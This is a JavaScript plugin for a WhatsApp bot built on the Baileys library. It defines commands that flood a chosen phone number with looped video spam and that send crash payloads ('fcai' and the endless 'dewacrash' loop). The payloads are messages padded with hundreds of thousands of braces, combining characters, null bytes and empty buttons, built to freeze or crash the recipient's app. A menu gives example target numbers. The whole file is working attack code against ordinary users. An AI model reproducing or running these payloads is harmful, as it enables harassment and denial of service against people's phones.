const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        return null;
    }
}

function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== VIDEO SPAM ====================
async function spamVideo(conn, target) {
    const videoUrls = [
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4'
    ];
    const captions = [
        '🔥 Angee kamu kan?!',
        '🎬 Video spesial buat kamu!'
    ];
    const randomVideo = videoUrls[Math.floor(Math.random() * videoUrls.length)];
    const randomCaption = captions[Math.floor(Math.random() * captions.length)];
    await conn.sendMessage(target, {
        video: { url: randomVideo },
        mimetype: 'video/mp4',
        caption: randomCaption
    });
}

cmd({
    pattern: "videospam",
    desc: "🎥 Send random videos in a loop (default 10, max 50)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "videospam");
    if (!target) return;
    let count = parseInt(args[1]) || 10;
    if (count > 50) count = 50;
    await reply(`🎥 *VIDEO SPAM* → ${target}\n_Sending ${count} random videos..._`);
    try {
        for (let i = 0; i < count; i++) {
            await spamVideo(conn, target);
            await new Promise(r => setTimeout(r, 200));
        }
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ VIDEO SPAM DELIVERED → ${target}\n⚠️ *${count} videos sent.*`;
        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
        else await reply(caption);
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== FC MODAL GPT ====================
async function fcModalGpt(conn, target) {
    const interactiveMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: {
                        stanzaId: "xyo_ai" + Date.now(),
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 999,
                                expiryTimestamp: 9999999999999,
                                businessOwnerJid: target
                            }
                        },
                        forwardingScore: 999999,
                        isForwarded: true,
                        externalAdReply: {
                            title: "xyo_ai",
                            body: "davina karamoy",
                            thumbnailUrl: "https://files.catbox.moe/n3ze5i.jpg",
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(150000)
                    },
                    body: {
                        text: `xyo ai`.repeat(50)
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, interactiveMsg.message, {});

    const extendedMsg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "xyo ai".repeat(50000),
            contextInfo: {
                quotedMessage: {
                    contactMessage: {
                        displayName: "xyo ai".repeat(5000),
                        vcard: "BEGIN:VCARD\nxyo gpt".repeat(5000)
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, extendedMsg.message, {});
}

cmd({
    pattern: "fcai",
    desc: "🤖 Send FcModalGpt crash in a loop (default 10, max 50)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "fcai");
    if (!target) return;
    let count = parseInt(args[1]) || 10;
    if (count > 50) count = 50;
    await reply(`🤖 *FC MODAL GPT* → ${target}\n_Sending ${count} cycles (2 payloads each)..._`);
    try {
        for (let i = 0; i < count; i++) {
            await fcModalGpt(conn, target);
            await new Promise(r => setTimeout(r, 150));
        }
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ FC MODAL GPT DELIVERED → ${target}\n⚠️ *${count} cycles sent (${count*2} payloads).*`;
        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
        else await reply(caption);
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== DEWA CRASH (INFINITE LOOP) ====================
async function dewaCrashCycle(conn, target) {
    // 1. Interactive with 500k empty buttons
    const psn1 = {
        interactiveMessage: {
            body: { text: "Dewa Killed You" },
            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
        }
    };
    await conn.relayMessage(target, { groupStatusMessageV2: { message: psn1 } }, { participant: { jid: target } });

    // 2. dewa1 - newsletter + interactive + extended text
    const dewa1 = {
        interactiveMessage: {
            newsletterAdminInviteMessage: {
                newsletterJid: "0@newsletter",
                newsletterName: "Dewa Killed You " + "ꦾ".repeat(980000),
                caption: "Dewa Killed You " + "ꦽ".repeat(590000),
                inviteCode: "ꦽ".repeat(182728),
                inviteExpiration: "99999999999",
            },
            body: { text: "Dewa Killed You " + "ោ៝".repeat(9827272) },
            contextInfo: {
                stanzaId: "12345678910ABCDEF",
                participant: target,
                remoteJid: "X",
                mentionedJid: [target],
                qoutedMessage: { conversation: "Dewa Killed You " + "ꦽ".repeat(250000) + "ꦾ".repeat(250000) }
            },
            nativeFlowMessage: {
                messageParamsJson: "{}".repeat(120000),
                messageVersion: 3,
            },
            extendedTextMessage: {
                text: "Dewa Killed You " + "makloytmm" + "ꦽ".repeat(500000) + "ꦾ".repeat(50000000),
                contextInfo: { participant: target }
            }
        }
    };
    await conn.relayMessage(target, dewa1, { participant: { jid: target } });

    // 3. dewa2 - groupInvite + newsletter
    const dewa2 = {
        viewOnceMessage: {
            message: {
                groupInviteMessage: {
                    groupJid: "1887967@g.us",
                    inviteCode: "ꦽ".repeat(38000),
                    inviteExpiration: "99999999999",
                    groupName: "Dewa Killed You " + "DewaKillYou" + "ꦾ".repeat(99700),
                    caption: "Dewa Killed You " + "https://t.me/makloytmm",
                    body: { text: "Dewa Killed You " + "ꦾ".repeat(10000) },
                    newsletterAdminInviteMessage: {
                        newsletterJid: "0@newsletter",
                        newsletterName: "Dewa Killed You " + "ꦾ".repeat(980000),
                        caption: "Dewa Killed You " + "ꦽ".repeat(590000),
                        inviteExpiration: "909092899",
                    },
                    contextInfo: { participant: target }
                }
            }
        }
    };
    await conn.relayMessage(target, dewa2, { participant: { jid: target } });

    // 4. Location message
    const locationMsg = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: -999.4771901,
                    degreesLongitude: 999.4771901,
                    name: "Dewa Killed You?",
                    address: "Dewa Killed You",
                    contextInfo: {
                        stanzaId: "A53737D6CE47253579FA0A0CA9A94F1C",
                        participant: target
                    }
                }
            }
        }
    };
    await conn.relayMessage(target, locationMsg, {});

    // 5. Interactive with 500k empty buttons (again)
    const psn2 = {
        interactiveMessage: {
            body: { text: "Dewa Killed You" },
            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
        }
    };
    await conn.relayMessage(target, { groupStatusMessageV2: { message: psn2 } }, { participant: { jid: target } });

    // 6. dewa3 - interactiveResponse with 900k null bytes
    const dewa3 = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "Dewa Killed You", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(900000),
                        version: 3
                    },
                    contextInfo: {
                        participant: target,
                        mentionedJid: Array.from({ length: 5000 }, (_, r) => `${88888888 + r + 1}@s.whatsapp.net`),
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "Dewa Killed You ",
                            newsletterJid: "120363344594934051@newsletter",
                            serverMessageId: 143,
                        },
                        businessMessageForwardInfo: { businessOwnerJid: "13135550002@s.whatsapp.net" }
                    }
                }
            }
        }
    };
    await conn.relayMessage(target, dewa3, { participant: { jid: target } });

    // 7. galaxyMsg - galaxy_message with 1MB null bytes
    const galaxyMsg = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "Dewa Killed You - Galaxy", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    contextInfo: {
                        participant: target,
                        mentionedJid: Array.from({ length: 5000 }, (_, r) => `${88888888 + r + 1}@s.whatsapp.net`),
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "Dewa Killed You ",
                            newsletterJid: "120363344594934051@newsletter",
                            serverMessageId: 143,
                        },
                        businessMessageForwardInfo: { businessOwnerJid: "13135550002@s.whatsapp.net" }
                    }
                }
            }
        }
    };
    await conn.relayMessage(target, galaxyMsg, { participant: { jid: target } });

    // 8. paymentMsg
    const paymentMsg = {
        sendPaymentMessage: {
            currencyCodeIso4217: 'IDR',
            requestFrom: target,
            expiryTimestamp: null,
            amount: 1,
            recipient: '0@whatsapp.net',
            contextInfo: {
                externalAdReply: {
                    title: "Dewa Killed You",
                    body: "Dewa Killed You " + "ြ".repeat(50000),
                    mimetype: 'audio/mpeg',
                    caption: "Dewa Killed You " + "ြ".repeat(50000),
                    showAdAttribution: true,
                    sourceUrl: 'https://t.me/dewareall',
                    thumbnailUrl: 'https://files.catbox.moe/181827.jpg'
                }
            }
        }
    };
    await conn.relayMessage(target, paymentMsg, { participant: { jid: target } });

    // 9. catalogMsg
    const catalogMsg = {
        interactiveMessage: {
            header: {
                title: "0",
                subtitle: "0",
                hasMediaAttachment: true,
                locationMessage: {
                    degreesLatitude: -6.200000,
                    degreesLongitude: 106.816666,
                    name: "🐉⭑‌⟅‌༑Dewa Killed You ༑‌⟆‌⭑🐉 ",
                    address: "RX7🌹",
                    jpegThumbnail: Buffer.alloc(10000, 'a').toString('base64'),
                },
            },
            body: { text: "Dewa" + "‌‌Killed You" },
            footer: { text: "#Makloytmm" },
            contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                externalAdReply: {
                    title: "▾ Dewa Killed You ",
                    body: "▾ Dewa Killed You ",
                    thumbnailUrl: "https://i.imgur.com/xxx.jpg",
                    sourceUrl: "https://t.me/makloytmm" + "Dewa Killed You ",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: "Dewa Killed You ",
                    newsletterJid: "0@newsletter",
                    serverMessageId: 143,
                },
                businessMessageForwardInfo: { businessOwnerJid: "0@s.whatsapp.net" }
            },
            nativeFlowMessage: {
                buttons: [
                    { name: 'catalog_message', buttonParamsJson: JSON.stringify({}) },
                    { name: 'booking_status', buttonParamsJson: JSON.stringify({}) },
                    { name: 'review_and_pay', buttonParamsJson: {} },
                    { name: 'payment_requested', buttonParamsJson: {} },
                ],
                messageParamsJson: '{}',
            },
        },
    };
    await conn.relayMessage(target, catalogMsg, { participant: { jid: target } });
}

cmd({
    pattern: "dewacrash",
    desc: "🐉 DEWA INFINITE CRASH – Runs forever (no count parameter, only target number)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "dewacrash");
    if (!target) return;
    await reply(`🐉 *DEWA INFINITE CRASH STARTED* → ${target}\n_Running in infinite loop... Press Ctrl+C to stop._`);
    let cycle = 0;
    while (true) {
        try {
            cycle++;
            console.log(`🐉 Dewa crash cycle ${cycle} for ${target}`);
            await dewaCrashCycle(conn, target);
            await new Promise(r => setTimeout(r, 1000)); // 1-second delay between cycles
        } catch (err) {
            console.error(`🐉 Dewa crash error:`, err.message);
            await new Promise(r => setTimeout(r, 2000));
            // Continue the loop – it will retry
        }
    }
});

// ==================== MENU ====================
cmd({
    pattern: "bugmenu",
    desc: "Show available crash commands",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .videospam [number] [count] – 🎥 Random video spam (loop)*\n*│ 📌 .fcai [number] [count] – 🤖 FcModalGpt crash (loop)*\n*│ 📌 .dewacrash [number] – 🐉 INFINITE CRASH (runs forever)*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .videospam 94712345678 20\n> .fcai 94712345678 15\n> .dewacrash 94712345678\n> ⚠️ *Extreme power – use only on numbers you own.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) {
        await conn.sendMessage(from, { image: menuImg, caption: menuText });
    } else {
        await reply(menuText);
    }
});
